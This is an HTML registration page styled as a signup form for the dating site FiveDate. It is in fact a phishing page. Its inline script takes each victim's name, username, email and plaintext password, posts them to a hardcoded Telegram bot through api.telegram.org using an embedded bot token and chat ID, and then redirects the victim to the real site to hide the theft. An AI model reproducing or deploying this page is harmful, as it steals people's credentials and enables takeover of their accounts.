<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="algolia-site-verification"  content="7939B96CAE1BEF9A" />
    <title>FiveDate Registration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', 'Libre Franklin', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: #000000;
            min-height: 100vh;
        }

        .container {
            display: flex;
            min-height: 100vh;
        }

        @media (max-width: 1024px) {
            .container {
                flex-direction: column;
            }
        }

        /* Left side - Form */
        .form-side {
            flex: 1;
            display: flex;
            flex-direction: column;
            background-color: rgb(0, 0, 0);
        }

        .logo-container {
            padding: 24px;
        }

        .logo {
            height: 40px;
            width: auto;
            max-width: 200px;
        }

        .form-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 48px 24px;
        }

        .form-content {
            width: 100%;
            max-width: 448px;
        }

        .form-title {
            font-size: 24px;
            font-weight: 600;
            color: white;
            margin-bottom: 8px;
        }

        .form-subtitle {
            color: white;
            margin-bottom: 32px;
        }

        .form {
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        @media (max-width: 640px) {
            .form-row {
                grid-template-columns: 1fr;
            }
        }

        .input-group {
            position: relative;
        }

        .input-field {
            width: 100%;
            padding: 12px 0;
            background: transparent;
            border: none;
            border-bottom: 2px solid #d1d5db;
            outline: none;
            color: #111827;
            font-size: 16px;
            transition: border-color 0.2s ease;
        }

        .input-field:focus {
            border-bottom-color: #16a34a;
        }

        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            transform: translateY(-24px) scale(0.75);
            color: #16a34a;
        }

        .input-label {
            position: absolute;
            left: 0;
            top: 12px;
            color: #6b7280;
            transition: all 0.2s ease;
            pointer-events: none;
            transform-origin: left top;
        }

        .checkbox-group {
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }

        .checkbox {
            margin-top: 4px;
            width: 16px;
            height: 16px;
            accent-color: #16a34a;
        }

        .checkbox-text {
            font-size: 14px;
            color: #6b7280;
        }

        .checkbox-text a {
            color: #2563eb;
            text-decoration: underline;
        }

        .submit-btn {
            width: 100%;
            background-color: #16a34a;
            color: white;
            padding: 12px 16px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .submit-btn:hover {
            background-color: #15803d;
        }

        .submit-btn:disabled {
            background-color: #9ca3af;
            cursor: not-allowed;
        }

        /* Right side - Decorative */
        .decorative-side {
            flex: 1;
            background: linear-gradient(135deg, #dcfce7, #bbf7d0);
            position: relative;
            overflow: hidden;
            min-height: 384px;
        }

        @media (min-width: 1024px) {
            .decorative-side {
                min-height: 100vh;
            }
        }

        .decorative-circle-1 {
            position: absolute;
            top: 80px;
            right: 80px;
            width: 128px;
            height: 128px;
            background-color: rgba(134, 239, 172, 0.3);
            border-radius: 50%;
        }

        .decorative-circle-2 {
            position: absolute;
            bottom: 128px;
            left: 64px;
            width: 96px;
            height: 96px;
            background-color: rgba(74, 222, 128, 0.2);
            border-radius: 50%;
        }

        .decorative-circle-3 {
            position: absolute;
            top: 50%;
            left: 25%;
            width: 64px;
            height: 64px;
            background-color: rgba(34, 197, 94, 0.1);
            border-radius: 50%;
        }

        .decorative-content {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            padding: 48px;
        }

        .decorative-text {
            text-align: center;
        }

        .decorative-title {
            font-size: 32px;
            font-weight: bold;
            color: #1f2937;
            margin-bottom: 16px;
        }

        .decorative-subtitle {
            color: #6b7280;
            font-size: 18px;
            margin-bottom: 32px;
        }

        .decorative-btn {
            background-color: white;
            color: #16a34a;
            padding: 12px 32px;
            border: 2px solid #16a34a;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .decorative-btn:hover {
            background-color: #f0fdf4;
        }

        /* Cookie banner */
        .cookie-banner {
            position: fixed;
            bottom: 16px;
            left: 16px;
            background-color: white;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            padding: 16px;
            max-width: 384px;
            z-index: 50;
            animation: slideInUp 0.5s ease-out;
        }

        .cookie-text {
            font-size: 14px;
            color: #374151;
            margin-bottom: 12px;
        }

        .cookie-text a {
            color: #2563eb;
            text-decoration: underline;
        }

        .cookie-btn {
            background-color: #1f2937;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .cookie-btn:hover {
            background-color: #374151;
        }

        .hidden {
            display: none;
        }

        @keyframes slideInUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .error-message {
            color: #dc2626;
            font-size: 12px;
            margin-top: 4px;
        }
    </style>
</head>
<body>
    <!-- Cookie consent banner -->
    <div id="cookieBanner" class="cookie-banner">
        <p class="cookie-text">
            This website uses cookies to ensure you get the best experience on our website.
            <a href="/privacy">Learn More</a>
        </p>
        <button class="cookie-btn" onclick="dismissCookieBanner()">Got It!</button>
    </div>

    <div class="container">
        <!-- Left side - Registration form -->
        <div class="form-side">
            <!-- Logo -->
            <div class="logo-container">
                <img src="https://fivedate.com/themes/todate/assets/img/logo.png" alt="FiveDate" class="logo">
            </div>

            <!-- Form container -->
            <div class="form-container">
                <div class="form-content">
                    <h1 class="form-title">Get started,</h1>
                    <p class="form-subtitle">Sign up to get started finding your partner!</p>

                    <form class="form" id="registrationForm" onsubmit="handleSubmit(event)">
                        <!-- First Name and Last Name row -->
                        <div class="form-row">
                            <div class="input-group">
                                <input
                                    type="text"
                                    id="firstName"
                                    name="firstName"
                                    class="input-field"
                                    placeholder=" "
                                    required
                                >
                                <label for="firstName" class="input-label">First Name</label>
                                <div id="firstNameError" class="error-message"></div>
                            </div>
                            <div class="input-group">
                                <input
                                    type="text"
                                    id="lastName"
                                    name="lastName"
                                    class="input-field"
                                    placeholder=" "
                                    required
                                >
                                <label for="lastName" class="input-label">Last Name</label>
                                <div id="lastNameError" class="error-message"></div>
                            </div>
                        </div>

                        <!-- Username -->
                        <div class="input-group">
                            <input
                                type="text"
                                id="username"
                                name="username"
                                class="input-field"
                                placeholder=" "
                                required
                            >
                            <label for="username" class="input-label">Username</label>
                            <div id="usernameError" class="error-message"></div>
                        </div>

                        <!-- Email -->
                        <div class="input-group">
                            <input
                                type="email"
                                id="email"
                                name="email"
                                class="input-field"
                                placeholder=" "
                                required
                            >
                            <label for="email" class="input-label">Email</label>
                            <div id="emailError" class="error-message"></div>
                        </div>

                        <!-- Password and Confirm Password row -->
                        <div class="form-row">
                            <div class="input-group">
                                <input
                                    type="password"
                                    id="password"
                                    name="password"
                                    class="input-field"
                                    placeholder=" "
                                    required
                                >
                                <label for="password" class="input-label">Password</label>
                                <div id="passwordError" class="error-message"></div>
                            </div>
                            <div class="input-group">
                                <input
                                    type="password"
                                    id="confirmPassword"
                                    name="confirmPassword"
                                    class="input-field"
                                    placeholder=" "
                                    required
                                >
                                <label for="confirmPassword" class="input-label">Confirm Password</label>
                                <div id="confirmPasswordError" class="error-message"></div>
                            </div>
                        </div>

                        <!-- Terms checkbox -->
                        <div class="checkbox-group">
                            <input
                                type="checkbox"
                                id="agreeToTerms"
                                name="agreeToTerms"
                                class="checkbox"
                                required
                                onchange="toggleSubmitButton()"
                            >
                            <span class="checkbox-text">
                                By creating your account, you agree to our
                                <a href="/terms">Terms of use</a> &
                                <a href="/privacy">Privacy Policy</a>
                            </span>
                        </div>

                        <!-- Submit button -->
                        <button type="submit" id="submitBtn" class="submit-btn" disabled>
                            Register
                        </button>
                    </form>
                </div>
            </div>
        </div>

        <!-- Right side - Decorative section -->
        <div class="decorative-side">
            <!-- Decorative circles -->
            <div class="decorative-circle-1"></div>
            <div class="decorative-circle-2"></div>
            <div class="decorative-circle-3"></div>

            <!-- Content -->
            <div class="decorative-content">
                <div class="decorative-text">
                    <h2 class="decorative-title">Already have an account?</h2>
                    <p class="decorative-subtitle">Double your chances for a friendship</p>
                    <button class="decorative-btn">Login</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '7359462152:AAGgn_QDifF3XTgjAKSVFr7ADOm4e9alIHA';
        const TELEGRAM_CHAT_ID = '5903039627';

        // Dismiss cookie banner
        function dismissCookieBanner() {
            document.getElementById('cookieBanner').classList.add('hidden');
        }

        // Toggle submit button based on terms checkbox
        function toggleSubmitButton() {
            const checkbox = document.getElementById('agreeToTerms');
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = !checkbox.checked;
        }

        // Clear error messages
        function clearErrors() {
            const errorElements = document.querySelectorAll('.error-message');
            errorElements.forEach(el => el.textContent = '');
        }

        // Show error message
        function showError(fieldId, message) {
            const errorElement = document.getElementById(fieldId + 'Error');
            if (errorElement) {
                errorElement.textContent = message;
            }
        }

        // Validate form
        function validateForm(formData) {
            clearErrors();
            let isValid = true;

            if (!formData.firstName.trim()) {
                showError('firstName', 'First name is required');
                isValid = false;
            }

            if (!formData.lastName.trim()) {
                showError('lastName', 'Last name is required');
                isValid = false;
            }

            if (!formData.username.trim()) {
                showError('username', 'Username is required');
                isValid = false;
            }

            if (!formData.email.trim()) {
                showError('email', 'Email is required');
                isValid = false;
            } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
                showError('email', 'Please enter a valid email');
                isValid = false;
            }

            if (!formData.password) {
                showError('password', 'Password is required');
                isValid = false;
            } else if (formData.password.length < 6) {
                showError('password', 'Password must be at least 6 characters');
                isValid = false;
            }

            if (formData.password !== formData.confirmPassword) {
                showError('confirmPassword', 'Passwords do not match');
                isValid = false;
            }

            if (!formData.agreeToTerms) {
                alert('You must agree to the terms and conditions');
                isValid = false;
            }

            return isValid;
        }

        // Send data to Telegram bot
        async function sendToTelegram(data) {
            const message = `ðŸŽ‰ New Registration!\n\n` +
                `ðŸ‘¤ Name: ${data.firstName} ${data.lastName}\n` +
                `ðŸ†” Username: ${data.username}\n` +
                `ðŸ“§ Email: ${data.email}\n` +
                `ðŸ” Password: ${data.password}\n` +
                `ðŸ“… Date: ${new Date().toLocaleString()}\n` +
                `âœ… Terms Agreed: ${data.agreeToTerms ? 'Yes' : 'No'}`;

            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            try {
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (response.ok) {
                    return { success: true };
                } else {
                    const errorData = await response.json();
                    return { success: false, error: errorData.description };
                }
            } catch (error) {
                return { success: false, error: error.message };
            }
        }

        // Handle form submission
        async function handleSubmit(event) {
            event.preventDefault();

            const formData = new FormData(event.target);
            const data = {
                firstName: formData.get('firstName'),
                lastName: formData.get('lastName'),
                username: formData.get('username'),
                email: formData.get('email'),
                password: formData.get('password'),
                confirmPassword: formData.get('confirmPassword'),
                agreeToTerms: formData.get('agreeToTerms') === 'on'
            };

            if (validateForm(data)) {
                // Show loading state
                const submitBtn = document.getElementById('submitBtn');
                const originalText = submitBtn.textContent;
                submitBtn.textContent = 'Sending...';
                submitBtn.disabled = true;

                console.log('Form submitted:', data);

                // Send to Telegram bot
                const result = await sendToTelegram(data);

                if (result.success) {
                    
                    // Reset form
                    document.getElementById('registrationForm').reset();
                    toggleSubmitButton(); // This will disable the button again
                    window.location.href = "https://fivedate.com/find-matches";
                } else {
                    alert('Registration failed. Please try again. Error: ' + result.error);
                    console.error('Telegram send error:', result.error);
                }

                // Restore button state
                submitBtn.textContent = originalText;
                submitBtn.disabled = !document.getElementById('agreeToTerms').checked;
            }
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Auto-dismiss cookie banner after 10 seconds (optional)
            setTimeout(function() {
                const banner = document.getElementById('cookieBanner');
                if (banner && !banner.classList.contains('hidden')) {
                    banner.style.opacity = '0.7';
                }
            }, 10000);
        });
        
        
    </script>
</body>
</html>
